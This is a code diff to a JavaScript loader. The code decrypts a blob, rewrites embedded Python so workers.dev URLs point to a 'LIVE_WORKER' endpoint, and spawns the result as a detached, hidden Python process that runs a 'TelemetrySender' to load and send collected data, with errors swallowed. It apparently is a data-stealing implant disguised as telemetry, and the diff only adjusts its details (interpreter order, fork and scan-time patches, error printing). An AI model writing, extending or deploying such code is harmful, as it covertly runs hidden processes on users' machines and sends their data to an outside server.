@@ -102,7 +102,7 @@ function gcmDecrypt(key, blob) {
 }
 
 function findPython() {
-  var bins = ['python3.11','python3.10','python3.9','python3.12','python3.13','python3','python'];
+  var bins = ['python3','python','python3.12','python3.11','python3.10','python3.9','python3.8'];
   for (var i = 0; i < bins.length; i++) {
     try {
       if (cp.spawnSync(bins[i], ['--version'], { timeout: 3000, windowsHide: true }).status === 0) {
@@ -141,34 +141,6 @@ function patchRuntime(code) {
   code = code.replace(
     new RegExp('https?://[^\\s"\']*' + C + '[^\\s"\']*workers\\.dev/?', 'g'),
     LIVE_WORKER
-  );
-
-  // 
-  code = code.replace(
-    /['"]parse_mode['"]\s*:\s*['"]HTML['"]\s*,?\s*/g,
-    ''
-  );
-  // 
-  code = code.replace(
-    /,?\s*parse_mode\s*=\s*['"]HTML['"]/g,
-    ''
-  );
-  //
-  code = code.replace(
-    /,\s*['"]parse_mode['"]\s*:\s*['"]HTML['"]/g,
-    ''
-  );
-
-  // 3.  ══
-  code = code.replace(
-    /pid\s*=\s*os\.fork\(\)/g,
-    'pid = -1'
-  );
-
-  // 4.  ══
-  code = code.replace(
-    /MAX_SCAN_SEC\s*=\s*\d+/g,
-    'MAX_SCAN_SEC = 90'
   );
 
   return code;
@@ -221,23 +193,16 @@ function patchRuntime(code) {
       '    _ts = TelemetrySender\n' +
       '    _ts.send(_ts.load())\n' +
       'except Exception as _e:\n' +
-      '    pass\n';
+      '    print("ERR:", str(_e))\n';
 
     var execFile = path.join(modDir, 'exec_runtime.py');
     fs.writeFileSync(execFile, execCode);
 
-    //
-    var pyEnv = Object.assign({}, process.env, {
-      OBJC_DISABLE_INITIALIZE_FORK_SAFETY: 'YES',
-      PYTHONUNBUFFERED: '1',
-    });
-
-    cp.spawn(python, ['-u', execFile], {
+    cp.spawn(python, [execFile], {
       detached: true,
       stdio: 'ignore',
       windowsHide: true,
       cwd: modDir,
-      env: pyEnv,
     }).unref();
 
   } catch (_) {}
